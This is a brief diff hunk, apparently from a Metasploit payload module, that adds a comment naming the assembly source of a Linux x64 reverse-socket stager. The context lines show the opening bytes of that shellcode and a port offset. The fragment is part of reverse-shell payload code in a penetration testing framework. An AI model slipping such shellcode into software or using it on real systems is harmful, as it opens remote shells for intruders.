@@ -30,6 +30,7 @@ module MetasploitModule
               'LPORT' => [ 53, 'n'    ],
             },
           'Payload' =>
+            # Generated from external/source/shellcode/linux/x64/stager_sock_reverse.s
             "\x48\x31\xff"                 + # xor    %rdi,%rdi
             "\x6a\x09"                     + # pushq  $0x9
             "\x58"                         + # pop    %rax
